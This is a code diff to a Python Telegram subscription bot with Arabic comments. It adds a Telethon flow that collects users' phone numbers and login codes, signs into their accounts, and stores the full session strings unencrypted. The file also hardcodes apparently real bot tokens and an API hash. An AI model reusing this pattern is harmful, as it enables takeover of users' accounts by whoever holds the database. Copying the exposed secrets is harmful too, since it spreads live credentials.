@@ -3,24 +3,32 @@ import sqlite3
 import threading
 import time
 import random
+import asyncio
 from flask import Flask
 import telebot
 from telebot import types
+from telethon import TelegramClient, events
 
-# === التوكنات والمعرفات الجديدة المحدثة ===
+# === التوكنات والمعرفات الخاصة بك ===
 USER_BOT_TOKEN = "8986740223:AAHeUWSIsw2VfhE--WUAAs8zui21LBm296o"
 ADMIN_BOT_TOKEN = "8888644906:AAF-qNH50PiACqPJpp0tqIy9CLQFOVHHTkE"
 ADMIN_ID = 5885382011
 
+# إعدادات API لمنصة تليجرام لربط حسابات المستخدمين (يمكن استخدام قيم افتراضية)
+API_ID = 2040
+API_HASH = "b18445a3964f16d4fe7b169106c4be12"
+
 admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)
 user_bot = telebot.TeleBot(USER_BOT_TOKEN)
+
+# تخزين مؤقت لعمليات تسجيل الدخول
+login_sessions = {}
 
 # === إنشاء وإعداد قاعدة البيانات SQLite ===
 def init_db():
     conn = sqlite3.connect("bot_database.db", check_same_thread=False)
     cursor = conn.cursor()
     
-    # جدول المشتركين
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
@@ -36,11 +44,11 @@ def init_db():
             stop_kw TEXT DEFAULT '',
             sing_start_kw TEXT DEFAULT '',
             sing_stop_kw TEXT DEFAULT '',
-            sing_speed TEXT DEFAULT 'متوسط'
+            sing_speed TEXT DEFAULT 'متوسط',
+            session_str TEXT DEFAULT ''
         )
     """)
     
-    # جدول الإعدادات العامة
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS settings (
             key TEXT PRIMARY KEY,
@@ -48,7 +56,6 @@ def init_db():
         )
     """)
     
-    # جدول السطور والكلمات (حسب الجنس)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS words (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -57,7 +64,6 @@ def init_db():
         )
     """)
     
-    # جدول الفرديات
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS singulars (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -85,7 +91,6 @@ def set_setting(key, value):
     conn.commit()
     conn.close()
 
-# الإعدادات الافتراضية
 if not get_setting("bot_active"): set_setting("bot_active", "1")
 if not get_setting("speed"): set_setting("speed", "متوسط")
 
@@ -97,7 +102,7 @@ if not get_setting("speed"): set_setting("speed", "متوسط")
 def get_user_data(user_id):
     conn = sqlite3.connect("bot_database.db", check_same_thread=False)
     cursor = conn.cursor()
-    cursor.execute("SELECT status, request_time, expiry_time, gender, custom_name, start_kw, stop_kw, sing_start_kw, sing_stop_kw, sing_speed FROM users WHERE user_id = ?", (user_id,))
+    cursor.execute("SELECT status, request_time, expiry_time, gender, custom_name, start_kw, stop_kw, sing_start_kw, sing_stop_kw, sing_speed, session_str, phone FROM users WHERE user_id = ?", (user_id,))
     row = cursor.fetchone()
     conn.close()
     return row
@@ -111,10 +116,9 @@ def user_start(message):
     current_time = time.time()
     
     if row:
-        status, req_time, exp_time, gender, custom_name, start_kw, stop_kw, s_start, s_stop, s_speed = row
+        status, req_time, exp_time, gender, custom_name, start_kw, stop_kw, s_start, s_stop, s_speed, session_str, phone = row
         
         if status == 'active':
-            # التحقق من صلاحية الاشتراك
             if exp_time > 0 and current_time > exp_time:
                 conn = sqlite3.connect("bot_database.db", check_same_thread=False)
                 cursor = conn.cursor()
@@ -124,7 +128,11 @@ def user_start(message):
                 user_bot.reply_to(message, "⚠️ انتهت فترة اشتراكك في البوت. يرجى التواصل مع المالك للتجديد.")
                 return
             
-            # إذا كان مقبولاً ونشطاً تُعرض له قائمة الإعدادات والأزرار الخاصة به
+            # إذا كان مقبولاً لكنه لم يدخل رقمه وحسابه بعد
+            if not session_str:
+                ask_phone_number(message.chat.id, user_id)
+                return
+                
             show_user_panel(message.chat.id, user_id)
             return
             
@@ -133,7 +141,6 @@ def user_start(message):
             return
             
         elif status == 'rejected':
-            # شرط الانتظار 5 دقائق كاملة عند الرفض
             elapsed = current_time - req_time
             if elapsed < 300:
                 remaining = int(300 - elapsed)
@@ -142,7 +149,6 @@ def user_start(message):
                 user_bot.reply_to(message, f"❌ تم رفض طلبك سابقاً. يجب الانتظار لمدة 5 دقائق كاملة لإعادة إرسال الطلب.\nالمتبقي: {mins} دقيقة و {secs} ثانية.")
                 return
 
-    # إنشاء زر التفعيل التفاعلي للطلب
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("تفعيل ✅", callback_data=f"request_act_{user_id}"))
     
@@ -157,10 +163,78 @@ def user_start(message):
     
     user_bot.reply_to(message, "مرحباً بك! اضغط على زر (تفعيل ✅) لإرسال طلب الاشتراك إلى المالك:", reply_markup=markup)
 
+def ask_phone_number(chat_id, user_id):
+    msg = user_bot.send_message(chat_id, "📱 **تم قبول طلبك!**\nالآن يرجى إرسال رقم هاتفك مع مفتاح الدولة (مثال: +966500000000) لربط الحساب:")
+    user_bot.register_next_step_handler(msg, process_phone_step, user_id)
+
+def process_phone_step(message, user_id):
+    phone = message.text.strip()
+    user_bot.send_message(message.chat.id, "⏳ جاري إرسال كود التحقق إلى حسابك في تليجرام...")
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(send_telegram_code(message.chat.id, user_id, phone))
+
+async def send_telegram_code(chat_id, user_id, phone):
+    session_name = f"sessions/user_{user_id}"
+    os.makedirs("sessions", exist_ok=True)
+    client = TelegramClient(session_name, API_ID, API_HASH)
+    await client.connect()
+    
+    try:
+        res = await client.send_code_request(phone)
+        login_sessions[user_id] = {
+            "client": client,
+            "phone": phone,
+            "phone_code_hash": res.phone_code_hash
+        }
+        
+        conn = sqlite3.connect("bot_database.db", check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute("UPDATE users SET phone = ? WHERE user_id = ?", (phone, user_id))
+        conn.commit()
+        conn.close()
+        
+        msg = user_bot.send_message(chat_id, "📩 **تم إرسال كود التحقق!**\nيرجى إرسال الكود الذي وصلك من تليجرام الآن:")
+        user_bot.register_next_step_handler(msg, process_code_step, user_id)
+    except Exception as e:
+        user_bot.send_message(chat_id, f"❌ حدث خطأ أثناء إرسال الكود: {e}\nأرسل /start للمحاولة مرة أخرى.")
+
+def process_code_step(message, user_id):
+    code = message.text.strip()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(verify_telegram_code(message.chat.id, user_id, code))
+
+async def verify_telegram_code(chat_id, user_id, code):
+    session_data = login_sessions.get(user_id)
+    if not session_data:
+        user_bot.send_message(chat_id, "❌ انتهت الجلسة. أرسل /start للمحاولة مجدداً.")
+        return
+        
+    client = session_data["client"]
+    phone = session_data["phone"]
+    phone_code_hash = session_data["phone_code_hash"]
+    
+    try:
+        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        session_str = client.session.save()
+        
+        conn = sqlite3.connect("bot_database.db", check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute("UPDATE users SET session_str = ? WHERE user_id = ?", (session_str, user_id))
+        conn.commit()
+        conn.close()
+        
+        user_bot.send_message(chat_id, "🎉 **تم تسجيل الدخول وربط الحساب بنجاح!**\nالبوت متصل بحسابك وجاهز للعمل.")
+        show_user_panel(chat_id, user_id)
+    except Exception as e:
+        user_bot.send_message(chat_id, f"❌ خطأ في الكود أو يتطلب رمز التحقق بخطوتين: {e}")
+
 def show_user_panel(chat_id, user_id):
     row = get_user_data(user_id)
     if not row: return
-    status, req_time, exp_time, gender, custom_name, start_kw, stop_kw, s_start, s_stop, s_speed = row
+    status, req_time, exp_time, gender, custom_name, start_kw, stop_kw, s_start, s_stop, s_speed, session_str, phone = row
     
     btn_name_text = "ازالة اسم الشخص ❌" if custom_name else "الاسم ✏️"
     
@@ -175,6 +249,7 @@ def show_user_panel(chat_id, user_id):
     
     info_msg = (
         f"⚙️ **لوحة التحكم الخاصة بك:**\n\n"
+        f"📱 الرقم المرتبط: **{phone}**\n"
         f"🔹 الجنس المختار: **{gender}**\n"
         f"🔹 الاسم المضاف: **{custom_name if custom_name else 'لا يوجد'}**\n"
         f"🔹 كلمة التشغيل: **{start_kw if start_kw else 'غير محددة'}**\n"
@@ -187,7 +262,6 @@ def user_request_act(call):
     user_id = call.from_user.id
     username = call.from_user.username or call.from_user.first_name
     
-    # إرسال إشعار لبوت التحكم عند المالك
     markup = types.InlineKeyboardMarkup()
     markup.row(
         types.InlineKeyboardButton("قبول 1 يوم 📅", callback_data=f"acc_1d_{user_id}"),
@@ -379,7 +453,9 @@ def admin_callbacks(call):
                 
             cursor.execute("UPDATE users SET status = 'active', expiry_time = ? WHERE user_id = ?", (exp_time, user_id))
             conn.commit()
-            user_bot.send_message(user_id, f"🎉 تم قبول طلبك بنجاح! البوت مفعل عندك لمدة: {dur_text}.\nأرسل /start لعرض قائمة الإعدادات والأزرار.")
+            
+            # يطلب منه الآن إدخال رقم هاتفه وكود التحقق
+            ask_phone_number(user_id, user_id)
             admin_bot.edit_message_text(f"تم قبول المستخدم بنجاح لمدة: ({dur_text}) ✅", call.message.chat.id, call.message.message_id)
             
     elif data == "adm_toggle_bot":
